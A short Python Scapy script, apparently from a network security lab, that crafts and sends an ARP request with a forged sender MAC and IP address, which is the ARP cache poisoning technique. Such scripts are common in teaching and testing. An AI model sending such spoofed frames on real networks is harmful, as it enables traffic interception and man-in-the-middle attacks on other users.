from scapy.all import *
E = Ether()
A = ARP()
A.hwsrc= "08:00:27:72:07:7d"
A.psrc = "10.0.2.15"
A.pdst = "10.0.2.6"
A.op=1
pkt = E/A

sendp(pkt)
